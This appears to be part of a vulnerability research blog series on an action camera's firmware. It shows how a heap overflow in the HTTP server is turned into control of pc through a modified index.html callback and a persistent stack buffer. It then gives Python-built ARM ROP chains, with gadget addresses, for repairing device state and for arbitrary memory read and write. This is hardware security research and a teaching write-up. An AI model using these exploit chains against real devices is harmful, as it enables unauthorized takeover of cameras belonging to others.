Lets exploit this heap overflow!

# What should we decrement?

As mentioned at the end of the previous blog, we need to find something that we can decrement by at most 13 to somehow gain execution.

As I had been working on the HTTP handlers, my mind went straight to the HTTP callbacks.

## HTTP Callback Analysis

When a callback is registered using the **http_register_callback** function, the name and callback are saved into a list of all of the callbacks which is located at a fixed position (*0xc09afe9c*).

The first callback that is registered is the **index.html** callback which provides the testing page. The name of this callback is located at *0xc09afe9c*, and the callback function itself (*0xc0218bd8*) is located at *0xc09afebc*.

So if we decrement this, what does this actually do?

![index_html_listing.png](/assets/images/analysing_an_action_camera_part_3/index_html_listing.png)

With our maximum of 13 bytes, we could execute the following instructions instead of **index_html_HTTP_callback**:

- **mvn r0, #0x0**
- **sub sp, r11, 0x1c**
- **ldmia sp!,{r4, r5, r6, r7, r8, r9, r11, pc}**

The only instruction that is of any real use there is the last **ldmia** as if we had control of values near the current stack pointer, this could potentially give us **pc**.

The callback is executed within the **http_request_proc** function, so this is the stack frame we will need to have control of.

# Whats on the Stack in **http_request_proc**?

After reversing the stack layout around the callback, the diagram summarise the structure of the stack:

![stack_frame.png](/assets/images/analysing_an_action_camera_part_3/stack_frame.png)

So we will be popping registers from the 'start' of the stack frame, lets have a look at what Ghidra thinks the stack frame looks like:

![ghidra_stack_frame.png](/assets/images/analysing_an_action_camera_part_3/ghidra_stack_frame.png)

Assuming we could execute the callback with control of the buffer, we should fill **r4-7** with everything up until *-0x620* at which point we will start popping from the first 256 byte buffer:

![stack_layout_http_proc.png](/assets/images/analysing_an_action_camera_part_3/stack_layout_http_proc.png)

So now we know where we are popping some registers + **pc** from, what is this buffer actually used for?

![what_is_the_buffer.png](/assets/images/analysing_an_action_camera_part_3/what_is_the_buffer.png)

The contents of the buffer appears to be checked against common HTTP methods (*GET* and *POST*). The buffer looks to be filled with the received HTTP message until it reaches either *0xfe* bytes, or (observed from doing some reversing) a space character is present.

Dynamic testing (causing lots of crashes with various inputs, thanks lack of debugging) revealed that if the method in the first line of the request was invalid, this request would fail, but it seems to process whatever is after the **\r\n** on the first line as a separate request? 

This means the buffer gets populated with *0xfe* bytes of whatever we send as the second line of our request (and it must not contain a null terminator or a space).

# Exploiting Stack Behaviour to Overwrite **pc**

So we control the buffer in the current request, but surely this would get cleared between requests, or its location would change between requests? Nope, as long as you use the same HTTP request slot, you can safely assume that the buffer will have the same contents as it did when the last request finished (minus the bits you overwrite of course).

We can force the same slot to be re-used by doing the following:
- Send the four heap overflow decrement requests and keep the connections alive (this ensures subsequent requests cannot use these slot, and prevents errors due to the decrement)
- Send the 'groom' malformed HTTP request which will populate the 256 byte buffer with data we control (the second line of the request)
- Close the socket and wait a small period of time to allow the slot to become free
- Send the **index.html** request to execute the modified callback and get code execution as it has used the same socket as the 'groom'  http request, and therefore our controlled data should get loaded into **pc**.

Lets test this theory - we set the second line of the 'groom' request to be a buffer overflow string (*Aa0Aa1Aa2Aa3Aa4Aa5Aa*), and we get the following crash log:

![pc_control.png](/assets/images/analysing_an_action_camera_part_3/pc_control.png)

If we look at the contents of the registers we popped:
- **r04** : *0x00000231*
- **r05** : *0xc4087b28*
- **r06** : *0x23232323* (####)
- **r07** : *0x23232323* (####)
- **r08** : *0x00544547* (*GET* - would have been a0Aa but was overwritten with trigger request)
- **r09** : *0x61413161* (*aA1a* - *a1Aa* endian swap)
- **r11** : *0x33614132* (*3aA2* - *2aA3* endian swap)
- **pc** : *0x41346144* (*A4aD* - *Aa4A* endian swap + unalign)

Nice! Works like a charm, we can see that **r4-7** are those 16 bytes before the buffer (as we saw in the Ghidra stack frame), and the rest of the registers come from the buffer that we control, and we end up overwriting pc!

# Free ROP-Chain

At this stage we have **pc** control, but how can we actually run code? Unlike previous projects, you can't just jump to a global, or heap, or stack, as they have explicit memory checks in place and you will crash if you try - looks like its another job for ROP!

Fortunately, we don't have to do anything crazy - our buffer is written 'up' the stack, i.e. the first character of the buffer has a lower address than the last character. As the stack grows downwards, in function prologues the stack pointer is decremented, and in the epilogue (and in ROP gadgets using **ldmia**), the stack pointer is incremented. 

This means that our buffer that has persisted from the previous request will be our ROP-chain as it is already growing in the right direction, and the stack pointer is already pointing within the buffer as a result of popping the registers (to gain execution) - so its just a matter of finding gadgets and building the chain.

The bad characters in this case are *\r*, *\n*, space, null terminator - all of the gadgets are at a fixed address, and as the base is *0xc0008000*, therefore, we don't have to worry about nulls in the gadget addresses as much.

## Fixing up State

Now that we have execution with ROP, ideally we want to prevent crashes as this causes a reboot. We need to fix up the following:
- Decrement the four values at the addresses that actually need decrementing to free the HTTP slots
- Unlock the mutex lock that is supposed to be unlocked at the end of the **http_request_proc** function
- Fix the stack pointer to be the value prior to **http_request_proc**
- Fixup the modified **index.html** callback

Lets take a look at the request I constructed to do this:

```
-python
# Construct the raw HTTP GET request
request = method + b" /index.html HTTP/1.1\r\n"
request += b"Accept-bbbba"
request += p32(0xc02b4edc) # pc

# 0xc02b4edc | ldmia sp!,{r4,r5,r6,r7,r11,pc} <- pop stuff off of the stack so we actually get a decent bit of control
request += p32(0xc05af011) # r4
request += p32(0xc006b11c) # r5 <- change this to insert more gadgets
request += p32(0xc04a28e0) # r6
request += p32(0xc09ae8d4 - 0xdc) # r7 - where we write the stack pointer we destroy
request += p32(0xdeadbeef) # r11
request += p32(0xc0486988) # pc

# | 0xc0486988 | c0486988 | blx r4 | c0486988 | blx r4  | <- go to thumb mode for the next gadget

```

Essentially the chain does the following:
- Save the value of the **sp** to a fixed location in memory (*0xc09ae8d4*)
- Decrement all the pointers that need decrementing (after reversing the fixed locations of the expected structures)
- Fix up the **index.html** callback
- Increment the value of the saved **sp** by *0x5d4* so that it is correct when execution is given back
- Set the value of **r7** to be the address of the mutex that needs to be unlocked
- Set **r11** to be the correct stack pointer value, and jump to the epilogue of **http_request_proc**
- Finally jump to **0xc02202e4**, which copies **r7** to **r0** and calls **pthread_mutex_unlock**, then returns

## Memory Read

To achieve this, I used the **setparamvalue** HTTP endpoint to write an address to a known global location (specifically, I know the location of a pointer to a struct that holds the value). The ROP-chain works as follows: it retrieves the value from the *encodec* parameter, which was set in an earlier request. The chain then loads this value, accesses the data at the referenced pointer, and saves the retrieved data back into the *encodec* parameter. This updated value can later be retrieved through a *getparamvalue* HTTP request.

```
-python
...
# | 0xc004e374 | c004e374 | str r0,[r5,#0xd6c] | c004e378  | ldmia sp!,{r4,r5,r6,r7,r8,pc} | 
request += p32(0xc09afa54 - 0x24) # r4 <- pointer to encodec config struct
request += p32(0xc0572494) # r5
request += p32(0xc0032894) # r6
request += p32(0xdeadbeef) # r7
request += p32(0xc0117ad4) # r8 
request += p32(0xc010dc94) # pc

# load pointer at encodec param into r2
# | 0xc010dc94 | c010dc94 | ldr r0,[r4,#0x24] | c010dc98  | blx r8 | 

# get the value stored in the encodec config entry struct
# | 0xc0117ad4 | c0117ad4 | ldr r0,[r0,#0x14] | c0117ad8 | ldmia sp!,{r11,pc} |
request += p32(0xdeadbeef) # r11
request += p32(0xc0586b48) # pc

# r0 contains the pointer we want to read
# | 0xc0586b48 | c0586b48 | cpy r4,r0 | c0586b50 | blx r5 | 

# after this r3 contains the value we want to save to the language pointer (we pre-adjusted address to account for offset)
# | 0xc0572494 | c0572494 | ldr r3,[r4,#0x4] | c057249c  | blx r6 | 

# | 0xc0032894 | c0032894 | ldmia sp!,{r4,r5,pc} |
request += p32(0xc09afa54) # r4 <- pointer to encodec config struct where we save
request += p32(0xc0160358) # r5
request += p32(0xc035ad94) # pc

# | 0xc035ad94 | c035ad94 | ldr r0,[r4,#0x0] | c035ad9c | blx r5 | 

# | 0xc0160358 | c0160358 | str r3,[r0,#0x14]| c016035c | ldmia sp!,{r11,pc}| 
request += p32(0xdeadbeef) # r11
request += p32(0xc003c2bc) # pc
...
```

Here it is reading the value at *0xc0008000*:

![mem_read.png](/assets/images/analysing_an_action_camera_part_3/mem_read.png)

## Memory Write

Writing memory uses a very similar technique to reading, except this time both the *language* and *encodec* parameters are used, storing the value and address respectively. The chain simply loads both values, and uses the **str r5,[r6#0x0]** gadget to do the write.

```
-python
...
# | 0xc0237e44 | c0237e44 | str r0,[r5,#0xc] | c0237e48 | ldmia sp!,{r4,r5,r11,pc} | 
request += p32(0xc09afa54 - 0x1c) # r4 <- pointer to encodec config struct
request += p32(0xdeadbeef) # r5 
request += p32(0xdeadbeef) # r11
request += p32(0xc058874c) # pc

# load pointer at language param into r5
# | 0xc058874c | c058874c | ldr r0,[r4,#0x1c] | c0588750 | ldmia sp!,{r4,r5,r11,pc} | 
request += p32(0xc0069468) # r4
request += p32(0xdeadbeef) # r5
request += p32(0xdeadbeef) # r11
request += p32(0xc0117ad4) # pc

# | 0xc0117ad4 | c0117ad4 | ldr r0,[r0,#0x14] | c0117ad8 | ldmia sp!,{r11,pc} |
request += p32(0xdeadbeef) # r11
request += p32(0xc058f124) # pc

# | 0xc058f124 | c058f124 | cpy r6,r0 | c058f130  | blx r4 | 

# | 0xc0069468 | ldmia sp!, {r4,pc} |
request += p32(0xc09afa30 - 0x1c) # r4 <- language config struct pointer in memory
request += p32(0xc058874c) # pc

## now load value at language param into some other register
# | 0xc058874c | c058874c | ldr r0,[r4,#0x1c] | c0588750 | ldmia sp!,{r4,r5,r11,pc} | 
request += p32(0xc003c2b8) # r4
request += p32(0xdeadbeef) # r5
request += p32(0xdeadbeef) # r11
request += p32(0xc0117ad4) # pc

# | 0xc0117ad4 | c0117ad4 | ldr r0,[r0,#0x14] | c0117ad8 | ldmia sp!,{r11,pc} |
request += p32(0xdeadbeef) # r11
request += p32(0xc03a33f4) # pc

# | 0xc03a33f4 | c03a33f4 | cpy r5,r0 | c03a33f8 | blx r4 | 

# | 0xc003c2b8 | c003c2b8 | str r5,[r6,#0x0] | c003c2bc | ldmia sp!,{r4,r5,r6,r7,r8,pc} |
...
```

It's a bit more difficult to show that it works, so you'll have to take my word for it (or buy your own camera of course).

# Conclusion

In this blog, we took the **strcpy()** heap overflow we discovered in the previous blog, and used a decrement caused by the overflow to modify a HTTP callback. We then exploited some quirks in the OS and the implementation of the HTTP request processor to pop registers off of an uncleared area of stack memory in order to gain control of **pc**. Next, we constructed ROP-chains using this newfound control to fix up the state of the camera after exploitation, and also wrote memory read/write ROP-chains. We have made great progress in this blog, but there's plenty more to do!
